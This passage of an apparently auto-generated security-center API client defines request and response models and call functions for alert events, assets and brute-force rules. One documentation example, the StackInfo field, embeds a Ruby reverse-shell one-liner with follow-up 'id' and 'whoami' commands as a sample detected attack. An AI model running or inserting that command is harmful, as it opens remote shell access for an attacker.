  alarmEventName?: string(name='AlarmEventName'),
  alarmEventType?: string(name='AlarmEventType'),
  currentPage?: int32(name='CurrentPage'),
  dealed?: string(name='Dealed'),
  from?: string(name='From'),
  groupId?: string(name='GroupId'),
  id?: long(name='Id'),
  lang?: string(name='Lang'),
  levels?: string(name='Levels'),
  operateErrorCodeList?: [ string ](name='OperateErrorCodeList'),
  operateTimeEnd?: string(name='OperateTimeEnd'),
  operateTimeStart?: string(name='OperateTimeStart'),
  pageSize?: string(name='PageSize'),
  remark?: string(name='Remark'),
  sortColumn?: string(name='SortColumn'),
  sortType?: string(name='SortType'),
  sourceIp?: string(name='SourceIp'),
  tacticId?: string(name='TacticId'),
  timeEnd?: string(name='TimeEnd'),
  timeStart?: string(name='TimeStart'),
  uniqueInfo?: string(name='UniqueInfo'),
  uuids?: string(name='Uuids'),
}

model DescribeAlarmEventListResponseBody = {
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId'),
  suspEvents?: [ 
    {
      alarmEventName?: string(name='AlarmEventName'),
      alarmEventNameOriginal?: string(name='AlarmEventNameOriginal'),
      alarmEventType?: string(name='AlarmEventType'),
      alarmUniqueInfo?: string(name='AlarmUniqueInfo'),
      canBeDealOnLine?: boolean(name='CanBeDealOnLine'),
      canCancelFault?: boolean(name='CanCancelFault'),
      dataSource?: string(name='DataSource'),
      dealed?: boolean(name='Dealed'),
      description?: string(name='Description'),
      endTime?: long(name='EndTime'),
      gmtModified?: long(name='GmtModified'),
      hasTraceInfo?: boolean(name='HasTraceInfo'),
      instanceId?: string(name='InstanceId'),
      instanceName?: string(name='InstanceName'),
      internetIp?: string(name='InternetIp'),
      intranetIp?: string(name='IntranetIp'),
      level?: string(name='Level'),
      operateErrorCode?: string(name='OperateErrorCode'),
      operateTime?: long(name='OperateTime'),
      saleVersion?: string(name='SaleVersion'),
      securityEventIds?: string(name='SecurityEventIds'),
      solution?: string(name='Solution'),
      stages?: string(name='Stages'),
      startTime?: long(name='StartTime'),
      suspiciousEventCount?: int32(name='SuspiciousEventCount'),
      tacticItems?: [ 
        {
          tacticDisplayName?: string(name='TacticDisplayName'),
          tacticId?: string(name='TacticId'),
        }
      ](name='TacticItems'),
      uuid?: string(name='Uuid'),
    }
  ](name='SuspEvents'),
}

model DescribeAlarmEventListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAlarmEventListResponseBody(name='body'),
}

async function describeAlarmEventListWithOptions(request: DescribeAlarmEventListRequest, runtime: Util.RuntimeOptions): DescribeAlarmEventListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.alarmEventName)) {
    query['AlarmEventName'] = request.alarmEventName;
  }
  if (!Util.isUnset(request.alarmEventType)) {
    query['AlarmEventType'] = request.alarmEventType;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.dealed)) {
    query['Dealed'] = request.dealed;
  }
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.levels)) {
    query['Levels'] = request.levels;
  }
  if (!Util.isUnset(request.operateErrorCodeList)) {
    query['OperateErrorCodeList'] = request.operateErrorCodeList;
  }
  if (!Util.isUnset(request.operateTimeEnd)) {
    query['OperateTimeEnd'] = request.operateTimeEnd;
  }
  if (!Util.isUnset(request.operateTimeStart)) {
    query['OperateTimeStart'] = request.operateTimeStart;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.sortColumn)) {
    query['SortColumn'] = request.sortColumn;
  }
  if (!Util.isUnset(request.sortType)) {
    query['SortType'] = request.sortType;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.tacticId)) {
    query['TacticId'] = request.tacticId;
  }
  if (!Util.isUnset(request.timeEnd)) {
    query['TimeEnd'] = request.timeEnd;
  }
  if (!Util.isUnset(request.timeStart)) {
    query['TimeStart'] = request.timeStart;
  }
  if (!Util.isUnset(request.uniqueInfo)) {
    query['UniqueInfo'] = request.uniqueInfo;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeAlarmEventList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeAlarmEventList(request: DescribeAlarmEventListRequest): DescribeAlarmEventListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAlarmEventListWithOptions(request, runtime);
}

model DescribeAlarmEventStackInfoRequest {
  eventName?: string(name='EventName', description='The name of the event.

>  You can call the [DescribeSuspEvents](~~DescribeSuspEvents~~) operation to query the names of events.', example='Mining program'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.168.XX.XX'),
  uniqueInfo?: string(name='UniqueInfo', description='The ID of the alert event.', example='1fbe8d16727f61d1478a674d6fa0****'),
  uuid?: string(name='Uuid', description='The UUID of the server to query.

>  You can call the [DescribeSuspEvents](~~DescribeSuspEvents~~) operation to query the UUIDs of servers.', example='18b7336e-d469-473b-af83-8e5420f9****'),
}

model DescribeAlarmEventStackInfoResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='ECC6B3E3-D496-512D-B46D-E6996A6B63EE'),
  stackInfo?: string(name='StackInfo', description='The stack information of the alert details.', example='\\[ { "child": \\[ { "child": \\[ { "child": \\[ ], "data": { "cmdline": "id", "proc_path": "/bin/id", "pid": "\\[3033]" }, "description": { "extend": \\[ ], "main": { "content": "${pid} ${cmdline}", "content_type": "markdown" } } }, { "child": \\[ ], "data": { "cmdline": "whoami", "proc_path": "/bin/whoami", "pid": "\\[3035]" }, "description": { "extend": \\[ ], "main": { "content": "${pid} ${cmdline}", "content_type": "markdown" } } } ], "data": { "cmdline": "/bin/bash -c \\"id && whoami\\"", "proc_path": "/bin/bash", "pid": "\\[3022]" }, "description": { "extend": \\[ ], "main": { "content": "${pid} ${cmdline}", "content_type": "markdown" } } } ], "data": { "src_ip": "0.0.0.0", "cmdline": "ruby -rsocket -e exit if fork;c=TCPSocket.new(\\\\"0.0.0.0\\\\",\\\\"1111\\\\");while(cmd=c.gets);IO.popen(cmd,\\\\"r\\\\"){|io|c.print io.read}end", "file": "ruby", "login_port": "22", "login_type": "Password", "proc_path": "/usr/bin/ruby", "dst_port": "1111", "pid": "3011", "user": "root", "dst_ip": "0.0.0.0", "log_time": "2020-01-20 09:00:00" }, "description": { "extend": \\[ { "content": "${tpl_netstat}", "content_type": "text" } ], "main": { "content": "${pid} ${cmdline}", "content_type": "markdown" } } } ]'),
}

model DescribeAlarmEventStackInfoResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAlarmEventStackInfoResponseBody(name='body'),
}

async function describeAlarmEventStackInfoWithOptions(request: DescribeAlarmEventStackInfoRequest, runtime: Util.RuntimeOptions): DescribeAlarmEventStackInfoResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.eventName)) {
    query['EventName'] = request.eventName;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.uniqueInfo)) {
    query['UniqueInfo'] = request.uniqueInfo;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeAlarmEventStackInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeAlarmEventStackInfo(request: DescribeAlarmEventStackInfoRequest): DescribeAlarmEventStackInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAlarmEventStackInfoWithOptions(request, runtime);
}

model DescribeAllEntityResponseBody = {
  entityList?: [ 
    {
      groupId?: int32(name='GroupId'),
      instanceName?: string(name='InstanceName'),
      internetIp?: string(name='InternetIp'),
      intranetIp?: string(name='IntranetIp'),
      ip?: string(name='Ip'),
      os?: string(name='Os'),
      uuid?: string(name='Uuid'),
    }
  ](name='EntityList'),
  requestId?: string(name='RequestId'),
}

model DescribeAllEntityResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAllEntityResponseBody(name='body'),
}

async function describeAllEntityWithOptions(runtime: Util.RuntimeOptions): DescribeAllEntityResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeAllEntity',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeAllEntity(): DescribeAllEntityResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAllEntityWithOptions(runtime);
}

model DescribeAllGroupsRequest {
  lang?: string(name='Lang', description='The language of the content within the request and the response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
}

model DescribeAllGroupsResponseBody = {
  count?: int32(name='Count', description='The total number of server groups.', example='2'),
  groups?: [ 
    {
      groupFlag?: int32(name='GroupFlag', description='The type of the server group. Valid values:

*   **0**: the default group
*   **1**: other groups', example='1'),
      groupId?: int32(name='GroupId', description='The ID of the server group.', example='8834224'),
      groupName?: string(name='GroupName', description='The name of the server group.', example='abc'),
    }
  ](name='Groups', description='An array that consists of the information about server groups.'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model DescribeAllGroupsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAllGroupsResponseBody(name='body'),
}

async function describeAllGroupsWithOptions(request: DescribeAllGroupsRequest, runtime: Util.RuntimeOptions): DescribeAllGroupsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeAllGroups',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeAllGroups(request: DescribeAllGroupsRequest): DescribeAllGroupsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAllGroupsWithOptions(request, runtime);
}

model DescribeAllImageBaselineRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
}

model DescribeAllImageBaselineResponseBody = {
  imageBaselines?: {
    baselineClassList?: [ 
      {
        alias?: string(name='Alias', description='The alias of the baseline type.', example='Identity authentication'),
        baselineNameList?: [ 
          {
            alias?: string(name='Alias', description='The alias of the baseline.', example='Identity authentication'),
            baselineItemList?: [ 
              {
                alias?: string(name='Alias', description='The alias of the baseline check item.', example='Ensure that no accounts use the same Hash password.'),
                classKey?: string(name='ClassKey', description='The key of the type for the baseline.', example='identification'),
                itemKey?: string(name='ItemKey', description='The key of the name for the baseline check item.', example='duplicate_pwd_hash'),
                nameKey?: string(name='NameKey', description='The key of the name for the baseline.', example='identification'),
              }
            ](name='BaselineItemList', description='An array that consists of baseline check items.'),
            classKey?: string(name='ClassKey', description='The key of the type for the baseline.', example='identification'),
            nameKey?: string(name='NameKey', description='The key of the name for the baseline.', example='identification'),
          }
        ](name='BaselineNameList', description='An array that consists of baselines.'),
        classKey?: string(name='ClassKey', description='The key of the baseline type.', example='identification'),
      }
    ](name='BaselineClassList', description='An array that consists of baseline types.'),
  }(name='ImageBaselines', description='The baselines that are used in image baseline checks.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to query logs and troubleshoot issues.', example='1A975D03-5F49-5354-B2CB-3918D5DA****'),
}

model DescribeAllImageBaselineResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAllImageBaselineResponseBody(name='body'),
}

async function describeAllImageBaselineWithOptions(request: DescribeAllImageBaselineRequest, runtime: Util.RuntimeOptions): DescribeAllImageBaselineResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeAllImageBaseline',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeAllImageBaseline(request: DescribeAllImageBaselineRequest): DescribeAllImageBaselineResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAllImageBaselineWithOptions(request, runtime);
}

model DescribeAntiBruteForceRulesRequest {
  currentPage?: int32(name='CurrentPage'),
  id?: long(name='Id'),
  pageSize?: string(name='PageSize'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp'),
}

model DescribeAntiBruteForceRulesResponseBody = {
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId'),
  rules?: [ 
    {
      defaultRule?: boolean(name='DefaultRule'),
      enableSmartRule?: boolean(name='EnableSmartRule'),
      failCount?: int32(name='FailCount'),
      forbiddenTime?: int32(name='ForbiddenTime'),
      id?: long(name='Id'),
      machineCount?: int32(name='MachineCount'),
      name?: string(name='Name'),
      span?: int32(name='Span'),
      uuidList?: [ string ](name='UuidList'),
    }
  ](name='Rules'),
}

model DescribeAntiBruteForceRulesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAntiBruteForceRulesResponseBody(name='body'),
}

async function describeAntiBruteForceRulesWithOptions(request: DescribeAntiBruteForceRulesRequest, runtime: Util.RuntimeOptions): DescribeAntiBruteForceRulesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeAntiBruteForceRules',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeAntiBruteForceRules(request: DescribeAntiBruteForceRulesRequest): DescribeAntiBruteForceRulesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAntiBruteForceRulesWithOptions(request, runtime);
}

model DescribeAppVulScanCycleResponseBody = {
  cycle?: string(name='Cycle'),
  requestId?: string(name='RequestId'),
}

model DescribeAppVulScanCycleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAppVulScanCycleResponseBody(name='body'),
}

async function describeAppVulScanCycleWithOptions(runtime: Util.RuntimeOptions): DescribeAppVulScanCycleResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeAppVulScanCycle',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeAppVulScanCycle(): DescribeAppVulScanCycleResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAppVulScanCycleWithOptions(runtime);
}

model DescribeAssetDetailByUuidRequest {
  lang?: string(name='Lang'),
  sourceIp?: string(name='SourceIp'),
  uuid?: string(name='Uuid'),
}

model DescribeAssetDetailByUuidResponseBody = {
  assetDetail?: {
    assetType?: string(name='AssetType'),
    authModifyTime?: long(name='AuthModifyTime'),
    authVersion?: int32(name='AuthVersion'),
    bind?: boolean(name='Bind'),
    clientStatus?: string(name='ClientStatus'),
    clientVersion?: string(name='ClientVersion'),
    cpu?: int32(name='Cpu'),
    cpuInfo?: string(name='CpuInfo'),
    createTime?: long(name='CreateTime'),
    diskInfoList?: [ string ](name='DiskInfoList'),
    flag?: int32(name='Flag'),
    groupTrace?: string(name='GroupTrace'),
    hostName?: string(name='HostName'),
    instanceId?: string(name='InstanceId'),
    instanceName?: string(name='InstanceName'),
    internetIp?: string(name='InternetIp'),
    intranetIp?: string(name='IntranetIp'),
    ip?: string(name='Ip'),
    ipList?: [ string ](name='IpList'),
    kernel?: string(name='Kernel'),
    macList?: [ string ](name='MacList'),
    mem?: int32(name='Mem'),
    memory?: long(name='Memory'),
    os?: string(name='Os'),
    osDetail?: string(name='OsDetail'),
    osName?: string(name='OsName'),
    region?: string(name='Region'),
    regionId?: string(name='RegionId'),
    regionName?: string(name='RegionName'),
    sysInfo?: string(name='SysInfo'),
    tag?: string(name='Tag'),
    uuid?: string(name='Uuid'),
    vpcInstanceId?: string(name='VpcInstanceId'),
  }(name='AssetDetail'),
  requestId?: string(name='RequestId'),
}

model DescribeAssetDetailByUuidResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAssetDetailByUuidResponseBody(name='body'),
}

async function describeAssetDetailByUuidWithOptions(request: DescribeAssetDetailByUuidRequest, runtime: Util.RuntimeOptions): DescribeAssetDetailByUuidResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeAssetDetailByUuid',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeAssetDetailByUuid(request: DescribeAssetDetailByUuidRequest): DescribeAssetDetailByUuidResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAssetDetailByUuidWithOptions(request, runtime);
}

model DescribeAssetDetailByUuidsRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  uuids?: string(name='Uuids', description='The UUIDs of the ECS instances. Separate multiple UUIDs with commas (,).', example='0687b17f-2a36-4e5****,0687b17f-2a36-4e****'),
}

model DescribeAssetDetailByUuidsResponseBody = {
  assetList?: [ 
    {
      assetType?: string(name='AssetType', description='The type of the asset.

The value is fixed as **0**, which indicates ECS instances.', example='0'),
      clientStatus?: string(name='ClientStatus', description='The status of the Security Center agent. Valid values:

*   **online**
*   **offline**', example='online'),
      flag?: int32(name='Flag', description='The type of the asset by source. Valid values:

*   **0**: The asset is provided by Alibaba Cloud.
*   **1**: The asset is not provided by Alibaba Cloud.
*   **2**: The asset resides in a data center.
*   **3**, **4**, **5**, and **7**: other cloud asset.
*   **8**: light-weight assets.', example='0'),
      instanceId?: string(name='InstanceId', description='The ID of the ECS instance.', example='i-rj9gda4wolo0zixi****'),
      instanceName?: string(name='InstanceName', description='The name of the ECS instance.', example='TestInstanceName'),
      internetIp?: string(name='InternetIp', description='The public IP address of the ECS instance.', example='10.10.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the ECS instance.', example='192.168.XX.XX'),
      ip?: string(name='Ip', description='The IP address of the ECS instance.

>  If the ECS instance has a public IP address, the value of this parameter is the public IP address of the ECS instance. If the ECS instance does not have a public IP address, the value of this parameter is the private IP address of the ECS instance.', example='10.10.XX.XX'),
      os?: string(name='Os', description='The operating system of the ECS instance.', example='Linux'),
      osName?: string(name='OsName', description='The name of the operating system run by the ECS instance.', example='CentOS 7.6 64-bit'),
      region?: string(name='Region', description='The region in which the ECS instance resides.', example='cn-guangzhou'),
      regionId?: string(name='RegionId', description='The region in which the ECS instance resides.

>  For more information about the mapping between region IDs and region names, see [Regions and zones](~~40654~~).', example='cn-shanghai'),
      regionName?: string(name='RegionName', description='The name of the region in which the ECS instance resides.', example='cn-shenzhen'),
      uuid?: string(name='Uuid', description='The UUID of the ECS instance.', example='2a98f149-0256-414c-a29a-a69f8a75****'),
      vpcInstanceId?: string(name='VpcInstanceId', description='The ID of the virtual private cloud (VPC).', example='13231-331331'),
    }
  ](name='AssetList', description='An array that consists of the details of the ECS instances.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='92016EC8-D52D-49D8-9FF7-9EA340A950B9'),
}

model DescribeAssetDetailByUuidsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAssetDetailByUuidsResponseBody(name='body'),
}

async function describeAssetDetailByUuidsWithOptions(request: DescribeAssetDetailByUuidsRequest, runtime: Util.RuntimeOptions): DescribeAssetDetailByUuidsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeAssetDetailByUuids',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeAssetDetailByUuids(request: DescribeAssetDetailByUuidsRequest): DescribeAssetDetailByUuidsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAssetDetailByUuidsWithOptions(request, runtime);
}

model DescribeAssetSummaryResponseBody = {
  assetsSummary?: {
    totalAssetAllRegion?: int32(name='TotalAssetAllRegion'),
    totalCoreAllRegion?: int32(name='TotalCoreAllRegion'),
    totalCoreNum?: int32(name='TotalCoreNum'),
  }(name='AssetsSummary'),
  requestId?: string(name='RequestId'),
}

model DescribeAssetSummaryResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAssetSummaryResponseBody(name='body'),
}

async function describeAssetSummaryWithOptions(runtime: Util.RuntimeOptions): DescribeAssetSummaryResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeAssetSummary',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeAssetSummary(): DescribeAssetSummaryResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAssetSummaryWithOptions(runtime);
}

model DescribeAssetsSecurityEventSummaryRequest {
  clusterId?: string(name='ClusterId'),
  containerFieldName?: string(name='ContainerFieldName'),
  containerFieldValue?: string(name='ContainerFieldValue'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp'),
}

model DescribeAssetsSecurityEventSummaryResponseBody = {
  assets?: [ 
    {
      assetType?: string(name='AssetType'),
      riskCount?: long(name='RiskCount'),
      totalCount?: long(name='TotalCount'),
    }
  ](name='Assets'),
  requestId?: string(name='RequestId'),
}

model DescribeAssetsSecurityEventSummaryResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAssetsSecurityEventSummaryResponseBody(name='body'),
}

async function describeAssetsSecurityEventSummaryWithOptions(request: DescribeAssetsSecurityEventSummaryRequest, runtime: Util.RuntimeOptions): DescribeAssetsSecurityEventSummaryResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.containerFieldName)) {
    query['ContainerFieldName'] = request.containerFieldName;
  }
  if (!Util.isUnset(request.containerFieldValue)) {
    query['ContainerFieldValue'] = request.containerFieldValue;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeAssetsSecurityEventSummary',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeAssetsSecurityEventSummary(request: DescribeAssetsSecurityEventSummaryRequest): DescribeAssetsSecurityEventSummaryResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAssetsSecurityEventSummaryWithOptions(request, runtime);
}

model DescribeAttackAnalysisDataRequest {
  base64?: string(name='Base64'),
  currentPage?: int32(name='CurrentPage'),
  data?: string(name='Data'),
  endTime?: long(name='EndTime'),
  lang?: string(name='Lang'),
  pageSize?: int32(name='PageSize'),
  startTime?: long(name='StartTime'),
  type?: string(name='Type'),
}

model DescribeAttackAnalysisDataResponseBody = {
  data?: string(name='Data'),
  page?: int32(name='Page'),
  pageSize?: int32(name='PageSize'),
  requestId?: string(name='RequestId'),
  total?: int32(name='Total'),
}

model DescribeAttackAnalysisDataResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAttackAnalysisDataResponseBody(name='body'),
}

async function describeAttackAnalysisDataWithOptions(request: DescribeAttackAnalysisDataRequest, runtime: Util.RuntimeOptions): DescribeAttackAnalysisDataResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.base64)) {
    query['Base64'] = request.base64;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.data)) {
    query['Data'] = request.data;
  }
  if (!Util.isUnset(request.endTime)) {
    query['EndTime'] = request.endTime;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.startTime)) {
    query['StartTime'] = request.startTime;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeAttackAnalysisData',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeAttackAnalysisData(request: DescribeAttackAnalysisDataRequest): DescribeAttackAnalysisDataResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAttackAnalysisDataWithOptions(request, runtime);
}

model DescribeAutoDelConfigResponseBody = {
  days?: int32(name='Days', description='The number of days during which a detected vulnerability is retained before the vulnerability is automatically deleted.', example='30'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='C56F66FD-C4EE-4813-ABDC-4FF94B6C384E'),
}

model DescribeAutoDelConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAutoDelConfigResponseBody(name='body'),
}

async function describeAutoDelConfigWithOptions(runtime: Util.RuntimeOptions): DescribeAutoDelConfigResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeAutoDelConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeAutoDelConfig(): DescribeAutoDelConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAutoDelConfigWithOptions(runtime);
}

model DescribeBackUpExportInfoRequest {
  currentPage?: int32(name='CurrentPage', example='1'),
  exportType?: string(name='ExportType', example='suspiciousExport'),
